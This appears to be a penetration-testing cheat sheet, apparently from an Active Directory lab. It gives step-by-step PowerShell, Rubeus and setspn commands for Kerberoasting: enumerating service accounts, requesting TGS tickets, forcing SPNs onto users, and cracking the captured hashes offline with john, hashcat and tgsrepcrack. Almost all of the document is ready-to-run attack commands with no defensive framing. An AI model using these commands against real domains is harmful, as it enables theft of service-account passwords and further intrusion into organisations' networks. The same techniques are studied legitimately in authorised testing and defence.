# Kerberoasting

Offline cracking of Service Account passwords which could then be used to create Silver Tickets 

## Find User Accounts used as Service Accounts

The following is the process using PowerView

```powershell
# This will print out the full details of the User Accounts
Get-NetUser -SPN

# Simplified Output 
Get-NetUser -SPN | select cn,serviceprincipalname
```

The following is the process using Active Directory modules

```powershell
# This will print out the full details of the User Accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Simplified Output
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName
```

## Request a TGS

Using PowerView 

```powershell
# Request the Ticket
Request-SPNTicket -SPN MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
```

**Note:** The output is different if you are using PowerView.ps1 vs. PowerView_dev.ps1 in that the hash is displayed in the output.

Using AD Modules to request the Ticket

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```
Using Rubeus

``` PowerShell
Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

We then run the command `klist` to confirm that we have been issued the TGS.

## Manually Set SPN

With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).  We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".


```powershell
# Find accounts that we have permission as User or Group 
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<user or group>"}

# Verify if the accounts  have an existing SPN
Get-DomainUser -Identity <username> | select ServicePrincipalName
```

Set SPN using PowerView

```powershell
Set-DomainObject -Identity <username> -Set @{ServicePrincipalName='ops/whatever'}

```

Set SPN using Active Directory Module

```powershell
Set-ADUser -Identity Support141User -ServicePrincipalNames @{Add='ops/whatever'}

```

Set SPN using SetSPN.exe

``` powershell
setspn.exe -U -S ops/whatever <username>
```

## Cracking

``` PowerShell
john --format=krb5tgs --wordlist=rockyou.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast rockyou.txt
./tgsrepcrack.py rockyou.txt exportedtgs.kirbi
```
